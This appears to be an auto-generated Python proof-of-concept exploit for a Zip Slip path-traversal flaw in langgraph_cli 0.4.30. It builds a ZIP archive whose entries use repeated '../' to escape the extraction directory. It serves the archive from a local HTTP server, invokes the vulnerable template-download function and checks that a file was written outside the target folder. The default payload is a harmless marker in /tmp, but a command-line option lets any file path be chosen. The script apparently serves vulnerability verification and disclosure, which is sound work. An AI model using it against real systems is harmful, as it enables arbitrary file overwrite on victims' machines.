#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli/langgraph_cli-0.4.30)
# Path: suspicious-003
# Sink: _download_repo_with_requests
# Auto-generated — run with: python3 afo_url_template_url_extracts__download_repo_with_requests_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Zip Slip in langgraph_cli-0.4.30

This script demonstrates the arbitrary file overwrite (AFO) vulnerability
in langgraph_cli's template download functionality. It creates a malicious
ZIP archive with path traversal entries and serves it via a local HTTP server,
then triggers the vulnerable code path.

Vulnerability: ZipFile.extractall() is called without validating entry names,
allowing entries with '../' to escape the extraction directory.

Impact: Arbitrary file write/overwrite on the target system.

Usage:
    python3 poc_zip_slip.py [--target-dir /tmp/exploit_test]

    The script will:
    1. Create a malicious ZIP with a path traversal entry
    2. Start a local HTTP server to serve the ZIP
    3. Run the vulnerable langgraph_cli command with a crafted template URL
    4. Verify the file was written outside the extraction directory
"""

import argparse
import io
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import zipfile
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

# Configuration
HOST = "127.0.0.1"
PORT = 9999
BENIGN_PAYLOAD = "poc_zip_slip_marker.txt"
PAYLOAD_CONTENT = "Zip Slip PoC - File written outside extraction directory\n"


class QuietHandler(SimpleHTTPRequestHandler):
    """HTTP handler that suppresses log output."""
    def log_message(self, format, *args):
        pass


def create_malicious_zip(output_path: str, target_path: str) -> None:
    """
    Create a ZIP archive containing a file with path traversal.

    The ZIP will contain:
    - A normal file (to make extraction look legitimate)
    - A file with '../' traversal to write outside the extraction directory

    Args:
        output_path: Where to save the ZIP file
        target_path: Absolute path where the traversal file should be written
    """
    print(f"[*] Creating malicious ZIP archive at: {output_path}")
    print(f"[*] Target file will be written to: {target_path}")

    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Normal file - this is what the code expects after extraction
        # (the code looks for a directory ending in "-main")
        normal_content = "This is a normal template file.\n"
        zf.writestr("template-main/README.md", normal_content)
        print("[*] Added normal entry: template-main/README.md")

        # Malicious entry with path traversal
        # Calculate how many '../' we need to reach the target
        # We know extraction happens in a temp directory, so we need to
        # traverse up from there to the filesystem root, then to target
        traversal_depth = 10  # More than enough to reach root
        traversal_path = "../" * traversal_depth + target_path.lstrip("/")
        zf.writestr(traversal_path, PAYLOAD_CONTENT)
        print(f"[*] Added traversal entry: {traversal_path}")

    # Verify the ZIP contains traversal
    with zipfile.ZipFile(output_path, 'r') as zf:
        names = zf.namelist()
        print(f"[*] ZIP contents: {names}")
        for name in names:
            if ".." in name:
                print(f"[!] Found traversal entry: {name}")


def start_http_server(directory: str) -> HTTPServer:
    """
    Start a simple HTTP server to serve the malicious ZIP.

    Args:
        directory: Directory to serve files from

    Returns:
        The started HTTP server instance
    """
    os.chdir(directory)
    server = HTTPServer((HOST, PORT), QuietHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] HTTP server started at http://{HOST}:{PORT}")
    return server


def run_vulnerable_command(target_dir: str, zip_url: str) -> bool:
    """
    Run the vulnerable langgraph_cli command.

    We simulate the vulnerable code path by directly calling the
    _download_repo_with_requests function with our malicious URL.

    Args:
        target_dir: Directory where the template should be extracted
        zip_url: URL to the malicious ZIP file

    Returns:
        True if command executed (even if it partially fails)
    """
    # We need to import the vulnerable module
    sys.path.insert(0, "/tmp/langgraph_cli/langgraph_cli-0.4.30")

    try:
        from langgraph_cli.templates import _download_repo_with_requests
    except ImportError as e:
        print(f"[!] Could not import vulnerable module: {e}")
        print("[*] Trying alternative: direct subprocess call")
        return run_via_subprocess(target_dir, zip_url)

    print(f"[*] Calling _download_repo_with_requests('{zip_url}', '{target_dir}')")
    try:
        _download_repo_with_requests(zip_url, target_dir)
        return True
    except Exception as e:
        print(f"[!] Function raised exception: {e}")
        # The function might fail after extraction, which is fine
        return True


def run_via_subprocess(target_dir: str, zip_url: str) -> bool:
    """
    Alternative: run the CLI command via subprocess.

    This simulates a real user running: langgraph new --template <url>

    Args:
        target_dir: Directory for the new project
        zip_url: URL to the malicious ZIP

    Returns:
        True if process completed
    """
    # The CLI doesn't directly accept URLs, so we need to modify the
    # TEMPLATE_ID_TO_CONFIG or use a different approach.
    # For this PoC, we'll directly call the Python function.
    print("[*] Attempting direct Python execution...")

    # Create a small wrapper script that calls the vulnerable function
    wrapper_code = f"""
import sys
sys.path.insert(0, "/tmp/langgraph_cli/langgraph_cli-0.4.30")
from langgraph_cli.templates import _download_repo_with_requests
_download_repo_with_requests("{zip_url}", "{target_dir}")
"""

    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(wrapper_code)
        wrapper_path = f.name

    try:
        result = subprocess.run(
            [sys.executable, wrapper_path],
            capture_output=True,
            text=True,
            timeout=30
        )
        print(f"[*] stdout: {result.stdout}")
        if result.stderr:
            print(f"[!] stderr: {result.stderr}")
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        print("[!] Subprocess timed out")
        return False
    finally:
        os.unlink(wrapper_path)


def verify_exploit(target_file: str) -> bool:
    """
    Check if the target file was written outside the extraction directory.

    Args:
        target_file: Path to the file that should have been created

    Returns:
        True if the file exists and contains our payload
    """
    print(f"[*] Checking for target file: {target_file}")

    if os.path.exists(target_file):
        with open(target_file, 'r') as f:
            content = f.read()
        if PAYLOAD_CONTENT in content:
            print(f"[+] SUCCESS: File written to {target_file}")
            print(f"[+] Content: {content.strip()}")
            return True
        else:
            print(f"[!] File exists but content doesn't match")
            return False
    else:
        print(f"[-] Target file not found at {target_file}")
        return False


def cleanup(target_dir: str, target_file: str) -> None:
    """
    Remove created files and directories.

    Args:
        target_dir: Extraction directory to remove
        target_file: Target file to remove
    """
    print("[*] Cleaning up...")
    if os.path.exists(target_dir):
        shutil.rmtree(target_dir, ignore_errors=True)
        print(f"[*] Removed directory: {target_dir}")
    if os.path.exists(target_file):
        os.unlink(target_file)
        print(f"[*] Removed file: {target_file}")


def main():
    parser = argparse.ArgumentParser(
        description="Zip Slip PoC for langgraph_cli-0.4.30"
    )
    parser.add_argument(
        "--target-dir",
        default="/tmp/exploit_test",
        help="Directory where template extraction is attempted"
    )
    parser.add_argument(
        "--output-file",
        default=f"/tmp/{BENIGN_PAYLOAD}",
        help="Target file to write via path traversal"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't remove created files after test"
    )
    args = parser.parse_args()

    target_dir = os.path.abspath(args.target_dir)
    target_file = os.path.abspath(args.output_file)

    print("=" * 60)
    print("Zip Slip PoC - langgraph_cli-0.4.30")
    print("=" * 60)
    print(f"[*] Target extraction directory: {target_dir}")
    print(f"[*] Target file to overwrite: {target_file}")

    # Create temporary directory for serving the ZIP
    with tempfile.TemporaryDirectory() as temp_dir:
        zip_path = os.path.join(temp_dir, "template.zip")

        # Step 1: Create malicious ZIP
        print("\n[Step 1] Creating malicious ZIP archive...")
        create_malicious_zip(zip_path, target_file)

        # Step 2: Start HTTP server
        print("\n[Step 2] Starting HTTP server...")
        server = start_http_server(temp_dir)
        zip_url = f"http://{HOST}:{PORT}/template.zip"
        print(f"[*] Malicious ZIP URL: {zip_url}")

        # Step 3: Create target directory
        print("\n[Step 3] Creating target extraction directory...")
        os.makedirs(target_dir, exist_ok=True)
        print(f"[*] Created directory: {target_dir}")

        # Step 4: Trigger the vulnerability
        print("\n[Step 4] Triggering vulnerable code path...")
        time.sleep(0.5)  # Give server time to start
        success = run_vulnerable_command(target_dir, zip_url)

        # Step 5: Verify exploit
        print("\n[Step 5] Verifying exploit...")
        time.sleep(0.5)  # Give file system time to sync
        exploit_success = verify_exploit(target_file)

        # Step 6: Cleanup
        if not args.no_cleanup:
            print("\n[Step 6] Cleaning up...")
            cleanup(target_dir, target_file)
        else:
            print(f"\n[Step 6] Skipping cleanup (--no-cleanup)")
            print(f"[*] Files preserved:")
            print(f"    - Extraction dir: {target_dir}")
            print(f"    - Target file: {target_file}")

        # Stop HTTP server
        server.shutdown()

    print("\n" + "=" * 60)
    if exploit_success:
        print("[RESULT] VULNERABLE - Zip Slip exploit succeeded!")
        print(f"[RESULT] Successfully wrote file to: {target_file}")
    else:
        print("[RESULT] Exploit did not succeed - may need adjustments")
        print("[RESULT] Check that the vulnerable code is accessible")
    print("=" * 60)

    return 0 if exploit_success else 1


if __name__ == "__main__":
    sys.exit(main())
